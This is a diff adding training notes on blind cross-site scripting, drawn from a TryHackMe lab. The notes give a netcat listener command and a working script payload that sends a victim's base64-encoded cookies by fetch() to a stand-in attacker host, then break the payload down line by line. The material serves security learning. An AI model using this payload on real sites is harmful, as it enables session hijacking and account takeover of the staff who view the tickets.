@@ -1,0 +1,41 @@
+
+Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.  
+  
+**Example Scenario:**  
+  
+A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.  
+  
+**Potential Impact:**  
+  
+Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
+
+**How to test for Blind XSS:**
+
+When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
+
+A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
+
+Example taken from Cross-site Scripting room `https://tryhackme.com/room/xss`:
+
+  
+Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.
+
+Using the AttackBox, let’s set up a listening server using Netcat. If we want to listen on port 9001, we issue the command `nc -l -p 9001`. The `-l` option indicates that we want to use Netcat in listen mode, while the `-p` option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add `-n`; moreover, to discover any errors, running Netcat in verbose mode by adding the `-v` option is recommended. The final command becomes `nc -n -l -v -p 9001`, equivalent to `nc -nlvp 9001`.
+
+Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.
+
+`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
+
+Let’s break down the payload:
+
+- The `</textarea>` tag closes the text area field.
+- The `<script>` tag opens an area for us to write JavaScript.
+- The `fetch()` command makes an HTTP request.
+- `URL_OR_IP` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
+- `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
+- `?cookie=` is the query string containing the victim’s cookies.
+- `btoa()` command base64 encodes the victim’s cookies.
+- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.
+- `</script>`closes the JavaScript code block.
+
+Now create another ticket using the above payload, making sure to swap out the `URL_OR_IP:PORT_NUMBER` variables with your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you will see the request come through containing the victim’s cookies.
